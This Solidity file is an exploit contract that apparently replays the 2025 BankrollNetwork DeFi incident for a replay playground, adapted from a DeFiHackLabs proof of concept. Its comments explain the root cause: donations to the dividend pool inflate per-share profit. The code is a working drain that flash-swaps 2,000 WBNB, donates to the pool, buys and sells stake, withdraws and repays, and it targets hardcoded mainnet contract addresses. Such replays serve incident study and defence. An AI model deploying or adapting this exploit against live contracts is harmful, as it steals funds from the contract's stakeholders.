// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-06-BankrollNetwork).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the PancakeSwap V2 flash-swap callback `pancakeCall`
// lives on the test itself), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/BankrollNetwork_exp.sol (BankrollNetwork.testExploit /
// pancakeCall).
//
// Root cause: BankrollNetworkStack (the "bankroll" Ponzi/dividend contract) lets
// anyone donatePool() tokens directly into its dividend pool, inflating
// profitPerShare for ALL current stakeholders including the caller's own
// just-purchased stake. The attacker flash-swaps 2,000 WBNB from the
// WBNB/USDT PancakeSwap pair, donates 1,000 WBNB into the pool, buys 240 WBNB
// worth of bankroll tokens, then immediately sells/withdraws — collecting a
// dividend share inflated by their own donation, walking away with far more
// WBNB than they put in net of the flash-swap fee.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IBankrollNetworkStack {
    function donatePool(uint256 tokenAmount) external;
    function buy(uint256 tokenAmount) external returns (uint256);
    function sell(uint256 tokenAmount) external;
    function myTokens() external view returns (uint256);
    function myDividends() external view returns (uint256);
    function withdraw() external;
}

contract BankrollNetworkDrain {
    address private constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private constant PAIR_ADDR = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address private constant BANKROLL_ADDR = 0xAdEfb902CaB716B8043c5231ae9A50b8b4eE7c4e;

    uint256 private constant BORROW_AMOUNT = 2_000 ether;
    uint256 private constant TOP_UP = 94064984776383565540;
    uint256 private constant REPAY_AMOUNT = 2005200000000000000000;

    IERC20 private constant wbnb = IERC20(WBNB_ADDR);
    IUniswapV2Pair private constant pair = IUniswapV2Pair(PAIR_ADDR);
    IBankrollNetworkStack private constant bankRollNetwork = IBankrollNetworkStack(BANKROLL_ADDR);

    // Recorded attack: flash-swap 2,000 WBNB out of the WBNB/USDT pair (no
    // upfront capital), which calls back into pancakeCall() below.
    function run() external {
        pair.swap(0, BORROW_AMOUNT, address(this), "0x3030");
    }

    // PancakeSwap V2 flash-swap callback (mirrors testExploit's pancakeCall
    // exactly). sender/amount0/amount1/data are unused, matching the original.
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        wbnb.approve(BANKROLL_ADDR, type(uint256).max);

        // Donate straight into the dividend pool — this inflates
        // profitPerShare for every current holder, including the stake this
        // same call is about to purchase below.
        bankRollNetwork.donatePool(1000 ether);

        bankRollNetwork.buy(240 ether);

        bankRollNetwork.sell(bankRollNetwork.myTokens());

        wbnb.transfer(BANKROLL_ADDR, TOP_UP);

        bankRollNetwork.withdraw();

        // Repay the flash swap (borrowed amount + PancakeSwap's 0.26% fee).
        wbnb.transfer(PAIR_ADDR, REPAY_AMOUNT);
    }
}
